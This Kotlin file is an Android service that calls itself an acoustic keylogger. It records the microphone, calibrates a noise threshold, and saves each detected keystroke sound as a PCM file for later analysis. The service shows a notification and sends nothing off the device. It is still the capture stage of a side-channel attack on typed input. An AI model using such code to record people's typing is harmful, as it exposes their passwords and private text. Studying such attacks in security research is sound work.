package com.acoustic.keylogger

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.BufferedOutputStream
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import java.nio.ByteOrder

class AcousticKeyloggerService : Service() {

    companion object {
        private const val TAG = "AcousticKeyloggerService"
        private const val CHANNEL_ID = "AcousticKeyloggerChannel"
        private const val NOTIFICATION_ID = 1

        // Intent Actions
        const val ACTION_STATUS_UPDATE = "com.acoustic.keylogger.ACTION_STATUS_UPDATE"
        const val ACTION_KEYSTROKE_DETECTED = "com.acoustic.keylogger.ACTION_KEYSTROKE_DETECTED"

        // Extras
        const val EXTRA_STATUS = "EXTRA_STATUS"
        const val EXTRA_THRESHOLD = "EXTRA_THRESHOLD"
        const val EXTRA_PEAK = "EXTRA_PEAK"
        const val EXTRA_COUNT = "EXTRA_COUNT"
        const val EXTRA_TIMESTAMP = "EXTRA_TIMESTAMP"
        const val EXTRA_FILE_PATH = "EXTRA_FILE_PATH"

        // States
        const val STATE_CALIBRATING = "CALIBRATING"
        const val STATE_LISTENING = "LISTENING"
        const val STATE_STOPPED = "STOPPED"
    }

    private var recordingThread: Thread? = null
    private var isRecording = false
    private var keystrokeCount = 0

    private lateinit var keystrokeDetector: KeystrokeDetector
    private lateinit var calibrator: Calibrator

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")

        // Standard notification construction
        val notification = buildNotification("Calibrating ambient noise floor...", "Please keep the area quiet.")
        
        // Start foreground with microphone service type (Android 10+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID, 
                notification, 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        startRecording()
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        Log.d(TAG, "Service stopped")
        stopRecording()
        broadcastStatus(STATE_STOPPED, 0)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun startRecording() {
        if (isRecording) return

        isRecording = true
        keystrokeCount = 0

        // Initialize Detector and Calibrator
        keystrokeDetector = KeystrokeDetector(onKeystrokeDetected = ::onKeystrokeFound)
        calibrator = Calibrator(
            calibrationDurationSec = 2.5,
            factor = 5.0,
            onCalibrated = ::onCalibrationFinished
        )

        broadcastStatus(STATE_CALIBRATING, 0)

        recordingThread = Thread({
            android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_AUDIO)
            
            val sampleRate = 44100
            val channelConfig = AudioFormat.CHANNEL_IN_MONO
            val audioFormat = AudioFormat.ENCODING_PCM_16BIT
            
            val minBufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
            val bufferSize = minBufferSize.coerceAtLeast(2048)

            try {
                val audioRecord = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    bufferSize
                )

                if (audioRecord.state != AudioRecord.STATE_INITIALIZED) {
                    Log.e(TAG, "AudioRecord initialization failed")
                    stopSelf()
                    return@Thread
                }

                audioRecord.startRecording()
                val buffer = ShortArray(1024)

                while (isRecording) {
                    val read = audioRecord.read(buffer, 0, buffer.size)
                    if (read > 0) {
                        if (!calibrator.isCalibrated()) {
                            val done = calibrator.feed(buffer, read)
                            if (done) {
                                // Calibration just finished in the loop
                            }
                        } else {
                            keystrokeDetector.feed(buffer, read)
                        }
                    }
                }

                audioRecord.stop()
                audioRecord.release()
            } catch (e: SecurityException) {
                Log.e(TAG, "Permission denied for recording audio: ${e.message}")
                stopSelf()
            } catch (e: Exception) {
                Log.e(TAG, "Error in recording thread: ${e.message}")
                stopSelf()
            }
        }, "KeyloggerAudioThread")

        recordingThread?.start()
    }

    private fun stopRecording() {
        isRecording = false
        recordingThread?.interrupt()
        recordingThread = null
    }

    private fun onCalibrationFinished(threshold: Int) {
        keystrokeDetector.setThreshold(threshold)
        broadcastStatus(STATE_LISTENING, threshold)
        updateNotification(
            "Listening for keystrokes...",
            "Acoustic threshold dynamically set to $threshold."
        )
    }

    private fun onKeystrokeFound(keystroke: ShortArray, peak: Int) {
        keystrokeCount++
        val timestamp = System.currentTimeMillis()
        val filePath = saveKeystrokeToFile(keystroke, keystrokeCount)

        // Broadcast to UI
        val intent = Intent(ACTION_KEYSTROKE_DETECTED).apply {
            putExtra(EXTRA_PEAK, peak)
            putExtra(EXTRA_COUNT, keystrokeCount)
            putExtra(EXTRA_TIMESTAMP, timestamp)
            putExtra(EXTRA_FILE_PATH, filePath ?: "")
        }
        sendBroadcast(intent)
    }

    private fun saveKeystrokeToFile(keystroke: ShortArray, index: Int): String? {
        return try {
            val dir = getExternalFilesDir(null) ?: filesDir
            if (!dir.exists()) dir.mkdirs()
            val file = File(dir, "keystroke_$index.pcm")
            val fos = FileOutputStream(file)
            
            // Allocate byte buffer for little endian 16-bit PCM writing
            val byteBuffer = ByteBuffer.allocate(keystroke.size * 2).apply {
                order(ByteOrder.LITTLE_ENDIAN)
                for (sample in keystroke) {
                    putShort(sample)
                }
            }
            fos.write(byteBuffer.array())
            fos.close()
            file.absolutePath
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save keystroke PCM: ${e.message}")
            null
        }
    }

    private fun broadcastStatus(status: String, threshold: Int) {
        val intent = Intent(ACTION_STATUS_UPDATE).apply {
            putExtra(EXTRA_STATUS, status)
            putExtra(EXTRA_THRESHOLD, threshold)
        }
        sendBroadcast(intent)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Acoustic Keylogger Background Listener",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Runs background microphone sampling to extract acoustic spikes."
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(title: String, text: String): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_btn_speak_now) // System microphone icon
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
    }

    private fun updateNotification(title: String, text: String) {
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        manager.notify(NOTIFICATION_ID, buildNotification(title, text))
    }
}
